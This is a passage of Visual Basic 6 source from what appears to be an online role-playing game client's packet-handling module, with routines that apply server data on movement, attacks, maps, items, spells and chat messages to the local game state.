        MapNpc(MapNpcNum).Y = Y
        MapNpc(MapNpcNum).Dir = Dir
        .XOffSet = 0
        .YOffSet = 0
        .moving = Movement

        Select Case MapNpc(MapNpcNum).Dir
            Case DIR_UP
                .YOffSet = PIC_Y
            Case DIR_DOWN
                .YOffSet = PIC_Y * -1
            Case DIR_LEFT
                .XOffSet = PIC_X
            Case DIR_RIGHT
                .XOffSet = PIC_X * -1
            Case DIR_UP_LEFT
                .YOffSet = PIC_Y
                .XOffSet = PIC_X
            Case DIR_DOWN_LEFT
                .YOffSet = PIC_Y * -1
                .XOffSet = PIC_X
            Case DIR_UP_RIGHT
                .XOffSet = PIC_X * -1
                .YOffSet = PIC_Y
            Case DIR_DOWN_RIGHT
                .XOffSet = PIC_X * -1
                .YOffSet = PIC_Y * -1
        End Select

    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNpcMove", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerDir(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim Dir As Byte
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    i = buffer.ReadLong
    Dir = buffer.ReadLong
    Call SetPlayerDir(i, Dir)

    With TempPlayer(i)
        .XOffSet = 0
        .YOffSet = 0
        .moving = 0
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerDir", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleNpcDir(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim Dir As Byte
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    i = buffer.ReadLong
    Dir = buffer.ReadLong

    With TempMapNpc(i)
        MapNpc(i).Dir = Dir
        If buffer.ReadByte = 1 Then
        .XOffSet = 0
        .YOffSet = 0
        .moving = 0
        End If
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNpcDir", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerXY(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim X As Long
Dim Y As Long
Dim Dir As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    X = buffer.ReadLong
    Y = buffer.ReadLong
    Dir = buffer.ReadLong
    Call SetPlayerX(MyIndex, X)
    Call SetPlayerY(MyIndex, Y)
    Call SetPlayerDir(MyIndex, Dir)
    ' Make sure they aren't walking
    TempPlayer(MyIndex).moving = 0
    TempPlayer(MyIndex).XOffSet = 0
    TempPlayer(MyIndex).YOffSet = 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerXY", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerXYMap(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim X As Long
Dim Y As Long
Dim Dir As Long
Dim buffer As clsBuffer
Dim thePlayer As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    thePlayer = buffer.ReadLong
    X = buffer.ReadLong
    Y = buffer.ReadLong
    Dir = buffer.ReadLong
    Call SetPlayerX(thePlayer, X)
    Call SetPlayerY(thePlayer, Y)
    Call SetPlayerDir(thePlayer, Dir)
    ' Make sure they aren't walking
    TempPlayer(thePlayer).moving = 0
    TempPlayer(thePlayer).XOffSet = 0
    TempPlayer(thePlayer).YOffSet = 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerXYMap", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleAttack(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    i = buffer.ReadLong
    TempPlayer(i).AFK = 0
    TempPlayer(i).LastMove = GetTickCount
    ' Set player to attacking
    If i <> MyIndex Then
        If TempPlayer(i).Attacking = 0 Then
            TempPlayer(i).Attacking = 1
            TempPlayer(i).AttackTimer = GetTickCount
            TempPlayer(i).AttackAnim = Rand(0, 1)
        End If
    End If
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleAttack", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleNpcAttack(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long, Victim As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    On Error Resume Next
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    i = buffer.ReadLong
    ' Set player to attacking
    TempMapNpc(i).Attacking = 1
    TempMapNpc(i).AttackTimer = GetTickCount
    If Npc(MapNpc(i).num).GFXPack = 1 Then TempMapNpc(i).AttackData1 = Rand(0, 1)
    
    Victim = buffer.ReadLong
    If Victim = MyIndex And buffer.ReadByte = 1 Then
        ReceiveAttack = GetTickCount
    End If
    
    TempMapNpc(i).AttackType = buffer.ReadByte
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNpcAttack", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleCheckForMap(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim X As Long
Dim Y As Long
Dim i As Long
Dim NeedMap As Byte
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()

    ' Erase all players except self
    For i = 1 To MAX_PLAYERS
        If i <> MyIndex Then
            Call SetPlayerMap(i, 0)
        End If
    Next

    ' Erase all temporary tile values
    Call ClearMapNpcs
    Call ClearMapItems
    Call ClearMap
    
    ' clear the blood
    For i = 1 To MAX_BYTE
        Blood(i).X = 0
        Blood(i).Y = 0
        Blood(i).Sprite = 0
        Blood(i).Timer = 0
    Next
    
    ' Get map num
    X = buffer.ReadLong
    ' Get revision
    Y = buffer.ReadLong

    If FileExist(MAP_PATH & "map" & X & MAP_EXT, False) Then
        Call LoadMap(X)
        ' Check to see if the revisions match
        NeedMap = 1

        If Map.Revision = Y Then
            ' We do so we dont need the map
            'Call SendData(CNeedMap & SEP_CHAR & "n" & END_CHAR)
            NeedMap = 0
            CacheNewMapSounds
            initAutotiles
        End If

    Else
        NeedMap = 1
    End If
    
        ' Either the revisions didn't match or we dont have the map, so we need it
    Set buffer = New clsBuffer
        buffer.WriteLong CNeedMap
        buffer.WriteLong NeedMap
        SendData buffer.ToArray()
    Set buffer = Nothing
        
    GettingMap = True
    frmMain.lblLoad.Tag = GetTickCount
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleCheckForMap", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleMapData(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim X As Long
Dim Y As Long
Dim i As Long, z As Long, w As Long
Dim buffer As clsBuffer
Dim mapnum As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()

    mapnum = buffer.ReadLong
    Map.name = buffer.ReadString
    Map.Music = buffer.ReadString
    Map.BGS = buffer.ReadString
    Map.Revision = buffer.ReadLong
    Map.Moral = buffer.ReadByte
    Map.Up = buffer.ReadLong
    Map.Down = buffer.ReadLong
    Map.Left = buffer.ReadLong
    Map.Right = buffer.ReadLong
    Map.BootMap = buffer.ReadLong
    Map.BootX = buffer.ReadByte
    Map.BootY = buffer.ReadByte
    
    Map.Weather = buffer.ReadLong
    Map.WeatherIntensity = buffer.ReadLong
    
    Map.Fog = buffer.ReadLong
    Map.FogSpeed = buffer.ReadLong
    Map.FogOpacity = buffer.ReadLong
    Map.FogDir = buffer.ReadByte
    
    Map.Red = buffer.ReadLong
    Map.Green = buffer.ReadLong
    Map.Blue = buffer.ReadLong
    Map.Alpha = buffer.ReadLong
    
    Map.MaxX = buffer.ReadByte
    Map.MaxY = buffer.ReadByte
    
    'Map.Ambiente = buffer.ReadByte
    
    ReDim Map.Tile(0 To Map.MaxX, 0 To Map.MaxY)

    For X = 0 To Map.MaxX
        For Y = 0 To Map.MaxY
            For i = 1 To MapLayer.Layer_Count - 1
                Map.Tile(X, Y).Layer(i).X = buffer.ReadLong
                Map.Tile(X, Y).Layer(i).Y = buffer.ReadLong
                Map.Tile(X, Y).Layer(i).Tileset = buffer.ReadLong
            Next
            For z = 1 To MapLayer.Layer_Count - 1
                Map.Tile(X, Y).Autotile(z) = buffer.ReadLong
            Next
            Map.Tile(X, Y).Type = buffer.ReadByte
            Map.Tile(X, Y).data1 = buffer.ReadLong
            Map.Tile(X, Y).data2 = buffer.ReadLong
            Map.Tile(X, Y).data3 = buffer.ReadLong
            Map.Tile(X, Y).Data4 = buffer.ReadString
            Map.Tile(X, Y).DirBlock = buffer.ReadByte
        Next
    Next

    For X = 1 To MAX_MAP_NPCS
        Map.Npc(X) = buffer.ReadLong
        Map.NpcSpawnType(X) = buffer.ReadLong
        n = n + 1
    Next
    Map.Panorama = buffer.ReadLong
    
    Map.Fly = buffer.ReadByte
    Map.Ambiente = buffer.ReadByte
    initAutotiles
    
    Set buffer = Nothing
    
    ' Save the map
    Call SaveMap(mapnum)
    
    CacheNewMapSounds

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapItemData(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()

    For i = 1 To MAX_MAP_ITEMS
        With MapItem(i)
            .PlayerName = buffer.ReadString
            .num = buffer.ReadLong
            .value = buffer.ReadLong
            .X = buffer.ReadLong
            .Y = buffer.ReadLong
            .BalanceValue = 0
            '.XOffSet = Rand(-10, 10)
            '.YOnSet = Rand(-5, 5)
        End With
    Next
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapItemData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapNpcData(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()

    For i = 1 To MAX_MAP_NPCS
        With MapNpc(i)
            .num = buffer.ReadLong
            .X = buffer.ReadLong
            .Y = buffer.ReadLong
            .Dir = buffer.ReadLong
            .Vital(HP) = buffer.ReadLong
            .MaxHP = buffer.ReadLong
            .PDL = buffer.ReadLong
        End With
    Next
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapNpcData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapDone()
Dim i As Long
Dim MusicFile As String
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    ' clear the action msgs
    For i = 1 To MAX_BYTE
        ClearActionMsg (i)
    Next i
    Action_HighIndex = 1
    
    ' load tilesets we need
    LoadTilesets
    
    If InGame Then
        MusicFile = Trim$(Map.Music)
        If Not MusicFile = "None." Then
            PlayMusic MusicFile
        Else
            If InGameTick + 3000 < GetTickCount Then StopMusic
        End If
    End If
    
    Npc_HighIndex = 0
    
    ' Get the npc high Index
    For i = MAX_MAP_NPCS To 1 Step -1
        If MapNpc(i).num > 0 Then
            Npc_HighIndex = i
            Exit For
        End If
    Next
    
    For i = 1 To MAX_BYTE
        ClearAnimInstance (i)
    Next
    
    initAutotiles
    
    CurrentWeather = Map.Weather
    CurrentWeatherIntensity = Map.WeatherIntensity
    CurrentFog = Map.Fog
    CurrentFogSpeed = Map.FogSpeed
    CurrentFogOpacity = Map.FogOpacity
    CurrentTintR = Map.Red
    CurrentTintG = Map.Green
    CurrentTintB = Map.Blue
    CurrentTintA = Map.Alpha

    GettingMap = False
    FadeType = 0
    FadeAmount = 255
    CanMoveNow = True
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapDone", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleBroadcastMsg(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    Msg = buffer.ReadString
    color = buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleBroadcastMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleGlobalMsg(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    Msg = buffer.ReadString
    color = buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleGlobalMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerMsg(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    Msg = buffer.ReadString
    color = buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapMsg(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    Msg = buffer.ReadString
    color = buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleAdminMsg(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim Msg As String
Dim color As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    Msg = buffer.ReadString
    color = buffer.ReadLong
    Call AddText(Msg, color)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleAdminMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSpawnItem(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = buffer.ReadLong

    With MapItem(n)
        .PlayerName = buffer.ReadString
        .num = buffer.ReadLong
        .value = buffer.ReadLong
        .X = buffer.ReadLong
        .Y = buffer.ReadLong
        .Gravity = -10
        .YOffSet = .Y + Rand(-10, 20)
        .XOffSet = Rand(-10, 10)
        .YOnSet = Rand(-5, 5)
        .PlaySound = False
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSpawnItem", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub
Private Sub HandleUpdateItem(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim buffer As clsBuffer
Dim ItemSize As Long
Dim ItemData() As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = buffer.ReadLong
    ' Update the item
    ItemSize = LenB(Item(n))
    ReDim ItemData(ItemSize - 1)
    ItemData = buffer.ReadBytes(ItemSize)
    CopyMemory ByVal VarPtr(Item(n)), ByVal VarPtr(ItemData(0)), ItemSize
    Set buffer = Nothing
    ' changes to inventory, need to clear any drop menu
    sDialogue = vbNullString
    GUIWindow(GUI_CURRENCY).visible = False
    inChat = False
    tmpCurrencyItem = 0
    CurrencyMenu = 0 ' clear
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateItem", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateAnimation(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim buffer As clsBuffer
Dim AnimationSize As Long
Dim AnimationData() As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = buffer.ReadLong
    ' Update the Animation
    AnimationSize = LenB(Animation(n))
    ReDim AnimationData(AnimationSize - 1)
    AnimationData = buffer.ReadBytes(AnimationSize)
    CopyMemory ByVal VarPtr(Animation(n)), ByVal VarPtr(AnimationData(0)), AnimationSize
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateAnimation", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSpawnNpc(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long, i As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = buffer.ReadLong

    With MapNpc(n)
        .num = buffer.ReadLong
        .X = buffer.ReadLong
        .Y = buffer.ReadLong
        .Dir = buffer.ReadLong
        ' Client use only
        TempMapNpc(n).XOffSet = 0
        TempMapNpc(n).YOffSet = 0
        TempMapNpc(n).moving = 0
        TempMapNpc(n).SpawnDelay = buffer.ReadByte
    End With
    
    Npc_HighIndex = 0
    
    ' Get the npc high Index
    For i = MAX_MAP_NPCS To 1 Step -1
        If MapNpc(i).num > 0 Then
            Npc_HighIndex = i
            Exit For
        End If
    Next

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSpawnNpc", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleNpcDead(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = buffer.ReadLong
    Call ClearMapNpc(n)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNpcDead", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateNpc(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim buffer As clsBuffer
Dim NpcSize As Long
Dim NpcData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    n = buffer.ReadLong
    
    NpcSize = LenB(Npc(n))
    ReDim NpcData(NpcSize - 1)
    NpcData = buffer.ReadBytes(NpcSize)
    CopyMemory ByVal VarPtr(Npc(n)), ByVal VarPtr(NpcData(0)), NpcSize
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateNpc", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateResource(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim ResourceNum As Long
Dim buffer As clsBuffer
Dim ResourceSize As Long
Dim ResourceData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    ResourceNum = buffer.ReadLong
    
    ResourceSize = LenB(Resource(ResourceNum))
    ReDim ResourceData(ResourceSize - 1)
    ResourceData = buffer.ReadBytes(ResourceSize)
    
    ClearResource ResourceNum
    
    CopyMemory ByVal VarPtr(Resource(ResourceNum)), ByVal VarPtr(ResourceData(0)), ResourceSize
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateResource", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapKey(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim EventNum As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    n = buffer.ReadByte
    EventNum = buffer.ReadLong
    Player(MyIndex).EventOpen(EventNum) = n
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapKey", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleUpdateShop(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim shopnum As Long
Dim buffer As clsBuffer
Dim ShopSize As Long
Dim ShopData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    shopnum = buffer.ReadLong
    
    ShopSize = LenB(Shop(shopnum))
    ReDim ShopData(ShopSize - 1)
    ShopData = buffer.ReadBytes(ShopSize)
    CopyMemory ByVal VarPtr(Shop(shopnum)), ByVal VarPtr(ShopData(0)), ShopSize
    
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateShop", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub
Private Sub HandleUpdateSpell(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim SpellNum As Long
Dim buffer As clsBuffer
Dim SpellSize As Long
Dim SpellData() As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    SpellNum = buffer.ReadLong
    
    SpellSize = LenB(Spell(SpellNum))
    ReDim SpellData(SpellSize - 1)
    SpellData = buffer.ReadBytes(SpellSize)
    CopyMemory ByVal VarPtr(Spell(SpellNum)), ByVal VarPtr(SpellData(0)), SpellSize
    Set buffer = Nothing
    
    ' Update the spells on the pic
    'Set buffer = New clsBuffer
    'buffer.WriteLong CSpells
    'SendData buffer.ToArray()
    'Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleUpdateSpell", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleSpells(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    
    For i = 1 To MAX_PLAYER_SPELLS
        PlayerSpells(i) = buffer.ReadLong
    Next
    Set buffer = Nothing
    
    UpdateSpellList
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSpells", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleLeft(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    Call ClearPlayer(buffer.ReadLong)
    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleLeft", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleResourceCache(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim i As Long
Dim ResourceNum As Long
Dim UpdateTile As Long

    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    ' if in map editor, we cache shit ourselves
    Set buffer = New clsBuffer
    buffer.WriteBytes data()
    ResourceNum = buffer.ReadLong
    Resources_Init = False

    If ResourceNum = 0 Then
        Resource_Index = buffer.ReadLong
        If Resource_Index > 0 Then
            ReDim Preserve MapResource(0 To Resource_Index)
    
            For i = 1 To Resource_Index
                MapResource(i).ResourceState = buffer.ReadByte
                MapResource(i).X = buffer.ReadLong
                MapResource(i).Y = buffer.ReadLong
                UpdateTile = buffer.ReadLong
                If UpdateTile > 0 Then
                    Map.Tile(MapResource(i).X, MapResource(i).Y).Type = TILE_TYPE_RESOURCE
                    Map.Tile(MapResource(i).X, MapResource(i).Y).data1 = UpdateTile
                End If
            Next
    
            Resources_Init = True
        Else
            ReDim MapResource(0 To 1)
        End If
    Else
        If Resource_Index < ResourceNum Then
            Resource_Index = ResourceNum
            ReDim Preserve MapResource(0 To ResourceNum)
        End If
        MapResource(ResourceNum).ResourceState = buffer.ReadByte
        MapResource(ResourceNum).X = buffer.ReadLong
        MapResource(ResourceNum).Y = buffer.ReadLong
        UpdateTile = buffer.ReadLong
        If UpdateTile > 0 Then
            Map.Tile(MapResource(ResourceNum).X, MapResource(ResourceNum).Y).Type = TILE_TYPE_RESOURCE
            Map.Tile(MapResource(ResourceNum).X, MapResource(ResourceNum).Y).data1 = UpdateTile
        End If
        Resources_Init = True
    End If

    Set buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleResourceCache", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSendPing(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    PingEnd = GetTickCount
    Ping = PingEnd - PingStart
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSendPing", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub


Private Sub HandleActionMsg(ByVal Index As Long, ByRef data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim buffer As clsBuffer
Dim X As Long, Y As Long, Message As String, color As Long, tmpType As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug >= 1 Then On Error GoTo errorhandler
    
    Set buffer = New clsBuffer
    
    buffer.WriteBytes data()
    Message = buffer.ReadString
    color = buffer.ReadLong
    tmpType = buffer.ReadLong
    X = buffer.ReadLong
    Y = buffer.ReadLong

    Set buffer = Nothing
    
    If tmpType = 5 Then
        BossMsg.Message = Message
        BossMsg.Created = GetTickCount
        BossMsg.color = color
